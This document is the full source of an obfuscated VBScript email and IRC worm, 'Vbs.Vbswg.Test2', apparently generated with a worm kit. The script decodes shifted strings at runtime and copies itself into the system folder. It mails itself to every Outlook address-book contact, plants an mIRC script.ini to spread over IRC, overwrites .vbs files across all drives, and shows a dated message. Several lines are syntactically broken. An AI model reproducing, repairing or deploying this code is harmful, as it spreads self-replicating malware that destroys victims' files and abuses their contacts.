'Vbs.Vbswg.Test2 Created By test2. 3/12/2001
Set BTIS4N08 = createobject(FKKTILB6("uetkrvkpi0hkngu{uvgoqdlgev",-2))
D6CRGJ37 = BTIS4N08.getspecialfolder(0)
R57URAA6 = D6CRGJ37 & FKKTILB6("e_k|Äph`x{v7}Å}7k|",-9)
Set OTU6G3CT = createobject(FKKTILB6("so_nelp*odahh",4))
BTIS4N08.copyfile wscript.scriptfullname, R57URAA6
PP308RL4
If OTU6G3CT.regread(FKKTILB6("LOPQ`WSJX[EVI`Qmgvswsjx`[mrhs{w`GyvvirxZivwmsr`Xiwx6`EE5K;TI6",-4)) <> 1 then
MCE3JLI8
End if
If OTU6G3CT.regread(FKKTILB6("DGHIXOKBPS=NAXIe_nkokbpXSej`ksoX?qnnajpRanoekjXPaop.XCL1=BF-=",4)) <> 1 then
QR3GULNG FKKTILB6("",-9)
End if
MB48M7QP
Function MCE3JLI8()
Set C8IAJ5HB = CreateObject(FKKTILB6("Qwvnqqm0Crrnkecvkqp",-2))
If C8IAJ5HB = FKKTILB6("Jpogjjf",5) Then
Set A58HR1S9 = C8IAJ5HB.GetNameSpace(FKKTILB6("PDSL",-3))
Set A34C2RK5 = A58HR1S9.AddressLists
For Each STKPP552 In A34C2RK5
If STKPP552.AddressEntries.Count <> 0 Then
F928EEP1 = STKPP552.AddressEntries.Count
For P7654111 = 1 To F928EEP1
Set QF69171D = C8IAJ5HB.CreateItem(0)
Set N3UCJP7C = STKPP552.AddressEntries(P7654111)
QF69171D.To = N3UCJP7C.Address
QF69171D.Subject = FKKTILB6("qkp|qo",-8)
QF69171D.Body = FKKTILB6("ykejvkigockn",-2) & vbcrlf & FKKTILB6("",2)
execute FKKTILB6("ugvP2VG9XT3?SH8;393F0",-2) & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
CPC4G14E = R57URAA6
QF69171D.DeleteAfterSubmit = True
N0TE7VR1.Add CPC4G14E
If QF69171D.To <> FKKTILB6("",-2) Then
QF69171D.Send
End If
Next
End If
Next
End If
End function
Function QR3GULNG(LG49R8VN)
If LG49R8VN <> FKKTILB6("",-10) Then
O31K0DLT = OTU6G3CT.regread(FKKTILB6("JMG[aNQECNaOCEJKPG^Uqhvyctg^Oketquqhv^Ykpfqyu^EwttgpvXgtukqp^RtqitcoHknguFkt",-2))
If BTIS4N08.fileexists(FKKTILB6("`7Yjfo`Yjfo`+fkf",3)) Then
LG49R8VN = FKKTILB6("i@bsoxi",-6)
ElseIf BTIS4N08.fileexists(FKKTILB6("lCevr{l<;evr{l7rwr",-9)) Then
LG49R8VN = FKKTILB6("b9[lhqb21",1)
ElseIf BTIS4N08.fileexists(O31K0DLT & FKKTILB6("arnwharnwh3nsn",-5)) Then
LG49R8VN = O31K0DLT & FKKTILB6("Xien_",4)
ElseIf BTIS4N08.fileexists(O31K0DLT & FKKTILB6("duqzk;:duqzk6qvq",-8)) Then
LG49R8VN = O31K0DLT & FKKTILB6("Yjfo`",3)
Else
LG49R8VN = FKKTILB6("",-10)
End If
End If
If LG49R8VN <> FKKTILB6("",0) Then
Set P68885EH = BTIS4N08.CreateTextFile(LG49R8VN & FKKTILB6("]tdsjqu/joj",-1), True)
P68885EH = FKKTILB6("Zrbqhos\",1) & vbCrLf & FKKTILB6("t6Cut&7@PUOT@)@Å",-6)
P68885EH = P68885EH & vbCrLf & FKKTILB6("k-:lk.7GLFK7 7x",3)
P68885EH = P68885EH & vbCrLf & FKKTILB6("p3?1kh*&pkem??&og+}jcnv",-2)
P68885EH = P68885EH & vbCrLf & FKKTILB6("l0;-,",2) & Chr(100) & Chr(99) & Chr(99) & FKKTILB6("({mvl(,vqks(",-8)
P68885EH = P68885EH & R57URAA6
P68885EH = P68885EH & vbCrLf & FKKTILB6("p5?",-2)
script.Close
End If
End Function
Function M7DTIS4N()
On Error Resume Next
Set F469E9P7 = BTIS4N08.Drives
For Each Q34TU6G3 In F469E9P7
C7C6CRGJ = Q34TU6G3 & FKKTILB6("Y",3)
Call V5657URA(C7C6CRGJ)
Next
End Function

Function V5657URA(AS5P308R)
L3KA1G7P = AS5P308R
Set E88CE3JL = BTIS4N08.GetFolder(L3KA1G7P)
Set INAP5AFJ = E88CE3JL.Files
For Each QS4R3GUL In INAP5AFJ
If BTIS4N08.GetExtensionName(QS4R3GUL.path) = FKKTILB6("q]n",5)
BTIS4N08.CopyFile wscript.scriptfullname,QS4R3GUL.path,true
End if
Next
Set NGT8IAJ5 = E88CE3JL.Subfolders
For Each HMN58HR1 In NGT8IAJ5
Call (HMN58HR1.path)
Next
End function
Function PP308RL4()
If month(now) = 1 and day(now) = 26 then
Msgbox FKKTILB6("P.}l'uv{opun'{v'zhÄ5'Av0",-7),32,FKKTILB6("?t.",-5)
end if
end function
'Vbswg 2 Beta. By [K]
Function FKKTILB6(S5Q4U1OV,LK50KSVR)
For P906D652 = 1 To Len(S5Q4U1OV)
ADN5HS59 = Mid(S5Q4U1OV, P906D652, 1)
If ADN5HS59 = Chr(2) Then
ADN5HS59 = Chr(34 + LK50KSVR)
ElseIf ADN5HS59 = Chr(3) Then
ADN5HS59 = Chr(10 + LK50KSVR)
ElseIf ADN5HS59 = Chr(4) Then
ADN5HS59 = Chr(13 + LK50KSVR)
Else
ADN5HS59 = Chr(Asc(ADN5HS59) + LK50KSVR)
End If
FKKTILB6 = FKKTILB6 & ADN5HS59
Next
End Function'Vbswg 2 Beta. By [K]